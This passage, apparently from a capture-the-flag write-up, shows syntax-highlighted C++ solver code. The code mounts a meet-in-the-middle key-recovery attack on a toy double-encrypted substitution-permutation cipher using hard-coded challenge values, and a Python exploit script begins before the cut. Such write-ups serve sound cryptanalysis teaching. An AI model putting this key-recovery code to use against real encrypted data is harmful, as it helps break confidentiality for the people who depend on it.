style="color:#ae81ff">10</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>}, {<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>}, {<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">6</span>}, {<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">15</span>}, {<span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>}};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> SInvBoxes[<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> {{<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0</span>}, {<span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>}, {<span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">12</span>}, {<span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>}, {<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">15</span>}, {<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>}};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> PBox[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> PInvBox[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>};

unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>  middle_data;

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">S</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> SBoxes[<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">16</span>]){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> output <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">6</span>; i<span style="color:#f92672">++</span>){
        output <span style="color:#f92672">|=</span> SBoxes[i][(block <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> i) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> i;
    }
    <span style="color:#66d9ef">return</span> output;
}
    
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">permute</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> pbox[]){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> output <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> bit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">24</span>; i<span style="color:#f92672">++</span>){
        bit <span style="color:#f92672">=</span> (block <span style="color:#f92672">&gt;&gt;</span> pbox[i]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>;
        output <span style="color:#f92672">|=</span> (bit <span style="color:#f92672">&lt;&lt;</span> i);
    }
    <span style="color:#66d9ef">return</span> output;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">encrypt_data</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> block;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; i<span style="color:#f92672">++</span>){
        res <span style="color:#f92672">^=</span> key;
        res <span style="color:#f92672">=</span> S(res, SBoxes);
        res <span style="color:#f92672">=</span> permute(res,PBox);
    }
    res <span style="color:#f92672">^=</span> key;
    <span style="color:#66d9ef">return</span> res;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">decrypt_data</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> block;
    res <span style="color:#f92672">^=</span> key;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; i<span style="color:#f92672">++</span>){
        res <span style="color:#f92672">=</span> permute(res, PInvBox);
        res <span style="color:#f92672">=</span> S(res, SInvBoxes);
        res <span style="color:#f92672">^=</span> key;
    }
    <span style="color:#66d9ef">return</span> res;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">encrypt</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key2){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> block;
    res <span style="color:#f92672">=</span> encrypt_data(res, key1);
    res <span style="color:#f92672">=</span> encrypt_data(res, key2);
    <span style="color:#66d9ef">return</span> res;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">decrypt</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key2){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> block;
    res <span style="color:#f92672">=</span> decrypt_data(res, key2);
    res <span style="color:#f92672">=</span> decrypt_data(res, key1);
    <span style="color:#66d9ef">return</span> res;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_middle_data</span>(){
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Init middle data&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> enc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000000</span>; i<span style="color:#f92672">++</span>){
        enc <span style="color:#f92672">=</span> encrypt_data(<span style="color:#ae81ff">0</span>,i);
        <span style="color:#66d9ef">if</span>(middle_data.find(enc) <span style="color:#f92672">==</span> middle_data.end()){
            middle_data.insert(pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(enc,i));
        }
        <span style="color:#66d9ef">else</span>{
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
            <span style="color:#66d9ef">do</span>{
                count<span style="color:#f92672">++</span>;
                tmp <span style="color:#f92672">=</span> count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> enc;
            }<span style="color:#66d9ef">while</span>(middle_data.find(tmp) <span style="color:#f92672">!=</span> middle_data.end());
            middle_data.insert(pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(tmp,i));
        }
    }
}

unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> find_possible_key(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> t){
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Find possible keys for &#34;</span> <span style="color:#f92672">&lt;&lt;</span> t <span style="color:#f92672">&lt;&lt;</span> endl;
    unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> result;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000000</span>; i<span style="color:#f92672">++</span>){
        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        dec <span style="color:#f92672">=</span> decrypt_data(t,i);
        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec_tmp <span style="color:#f92672">=</span> dec;
        <span style="color:#66d9ef">while</span>(middle_data.find(dec) <span style="color:#f92672">!=</span> middle_data.end()){
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key <span style="color:#f92672">=</span> i;
            <span style="color:#66d9ef">if</span>(result.find(key) <span style="color:#f92672">==</span> result.end()){
                result.insert(pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(key,middle_data[dec]));
            }
            <span style="color:#66d9ef">else</span>{
                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> tmp;
                <span style="color:#66d9ef">do</span>{
                    count<span style="color:#f92672">++</span>;
                    tmp <span style="color:#f92672">=</span> count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> key;
                }<span style="color:#66d9ef">while</span>(result.find(tmp) <span style="color:#f92672">!=</span> result.end());
                result.insert(pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(tmp,middle_data[dec]));
            }
            dec_count<span style="color:#f92672">++</span>;
            dec <span style="color:#f92672">=</span> dec_count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> dec_tmp;
        }
    }
    <span style="color:#66d9ef">return</span> result;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">recover_key_part2</span>(vector<span style="color:#f92672">&lt;</span> unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> possible_keys,vector<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>enc_labels,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> a0,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> b0,<span style="color:#66d9ef">int</span> idxi,<span style="color:#66d9ef">int</span> idxj){
    unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> choice_keys;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> c, c1, b1, a00;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>){
        <span style="color:#66d9ef">if</span>(i <span style="color:#f92672">==</span> idxi <span style="color:#f92672">||</span> i <span style="color:#f92672">==</span> idxj) <span style="color:#66d9ef">continue</span>;
        choice_keys <span style="color:#f92672">=</span> possible_keys[i];
        c <span style="color:#f92672">=</span> enc_labels[i];
        c1 <span style="color:#f92672">=</span> enc_labels[idxi];
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">auto</span> iter <span style="color:#f92672">=</span> choice_keys.begin(); iter <span style="color:#f92672">!=</span> choice_keys.end(); <span style="color:#f92672">++</span>iter){
            b1 <span style="color:#f92672">=</span> iter<span style="color:#f92672">-&gt;</span>first;
            <span style="color:#66d9ef">if</span>(b1 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x1000000</span>) <span style="color:#66d9ef">continue</span>;
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec_b1 <span style="color:#f92672">=</span> b1;
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
            <span style="color:#66d9ef">while</span>(choice_keys.find(b1) <span style="color:#f92672">!=</span> choice_keys.end()){
                a00 <span style="color:#f92672">=</span> choice_keys[b1];
                <span style="color:#66d9ef">if</span>(a0 <span style="color:#f92672">==</span> a00 <span style="color:#f92672">&amp;&amp;</span> decrypt(c,a0,dec_b1) <span style="color:#f92672">==</span> decrypt(c1,a0,b0)){
                    <span style="color:#66d9ef">return</span> dec_b1;
                }
                count<span style="color:#f92672">++</span>;
                b1 <span style="color:#f92672">=</span> count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> dec_b1;
            }
        }
    }
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">recover_key</span>(vector<span style="color:#f92672">&lt;</span> unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> possible_keys,vector<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>enc_labels){
    unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>  choice_keys, choice_keys2;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> c1, b0, a0, p1, c2, a1, b1;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>){
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Recover key &#34;</span> <span style="color:#f92672">&lt;&lt;</span> i <span style="color:#f92672">&lt;&lt;</span> endl;
        choice_keys <span style="color:#f92672">=</span> possible_keys[i];
        c1 <span style="color:#f92672">=</span> enc_labels[i];
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; j<span style="color:#f92672">++</span>){
            <span style="color:#66d9ef">if</span>(i <span style="color:#f92672">==</span> j) <span style="color:#66d9ef">continue</span>;
            choice_keys2 <span style="color:#f92672">=</span> possible_keys[j];
            c2 <span style="color:#f92672">=</span> enc_labels[j];
            <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">auto</span> iter <span style="color:#f92672">=</span> choice_keys.begin(); iter <span style="color:#f92672">!=</span> choice_keys.end(); <span style="color:#f92672">++</span>iter){
                b0 <span style="color:#f92672">=</span> iter<span style="color:#f92672">-&gt;</span>first;
                <span style="color:#66d9ef">if</span>(b0 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x1000000</span>) <span style="color:#66d9ef">continue</span>;
                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec_b0 <span style="color:#f92672">=</span> b0;
                <span style="color:#66d9ef">while</span>(choice_keys.find(b0) <span style="color:#f92672">!=</span> choice_keys.end()){
                    a0 <span style="color:#f92672">=</span> choice_keys[b0];
                    p1 <span style="color:#f92672">=</span> decrypt(c1, a0, dec_b0);
                    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> b0_tmp <span style="color:#f92672">=</span> dec_b0;
                    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count_tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
                    <span style="color:#66d9ef">while</span>(choice_keys2.find(b0_tmp) <span style="color:#f92672">!=</span> choice_keys2.end()){
                        a1 <span style="color:#f92672">=</span> choice_keys2[b0_tmp];
                        <span style="color:#66d9ef">if</span>(p1 <span style="color:#f92672">==</span> decrypt(c2,a1,dec_b0)){
                            b1 <span style="color:#f92672">=</span> recover_key_part2(possible_keys,enc_labels,a0,dec_b0,i,j);
                            <span style="color:#66d9ef">if</span>(b1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>){
                                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Find keys : a1 = &#34;</span> <span style="color:#f92672">&lt;&lt;</span> a1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;, b1 = &#34;</span> <span style="color:#f92672">&lt;&lt;</span> b1 <span style="color:#f92672">&lt;&lt;</span> endl;
                                <span style="color:#66d9ef">return</span> true;
                            }
                        }
                        count_tmp<span style="color:#f92672">++</span>;
                        b0_tmp <span style="color:#f92672">=</span> count_tmp <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> dec_b0;
                    }
                    count<span style="color:#f92672">++</span>;
                    b0 <span style="color:#f92672">=</span> count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> dec_b0;
                }
            }
        }
    }
    <span style="color:#66d9ef">return</span> false;
}


<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> g_tables[<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">4</span>][<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {{{<span style="color:#ae81ff">5737111L</span>, <span style="color:#ae81ff">2983937L</span>},{<span style="color:#ae81ff">15406556L</span>, <span style="color:#ae81ff">16284948L</span>},{<span style="color:#ae81ff">14172222L</span>, <span style="color:#ae81ff">14132908L</span>},{<span style="color:#ae81ff">4000971L</span>, <span style="color:#ae81ff">16383744L</span>}},{{<span style="color:#ae81ff">8204186L</span>, <span style="color:#ae81ff">1546264L</span>},{<span style="color:#ae81ff">229766L</span>, <span style="color:#ae81ff">3208405L</span>},{<span style="color:#ae81ff">9550202L</span>, <span style="color:#ae81ff">13483954L</span>},{<span style="color:#ae81ff">13257058L</span>, <span style="color:#ae81ff">5195482L</span>}}};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
    init_middle_data();
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>){
        vector<span style="color:#f92672">&lt;</span> unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> possible_keys(<span style="color:#ae81ff">4</span>);
        vector<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>enc_labels(<span style="color:#ae81ff">4</span>);
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; j<span style="color:#f92672">++</span>){
            possible_keys[j] <span style="color:#f92672">=</span> find_possible_key(g_tables[i][j][<span style="color:#ae81ff">1</span>]);
            enc_labels[j] <span style="color:#f92672">=</span> g_tables[i][j][<span style="color:#ae81ff">0</span>];
        }
        recover_key(possible_keys,enc_labels);
    }

}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># exp.py</span>
<span style="color:#f92672">import</span> hashlib

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(A, B):
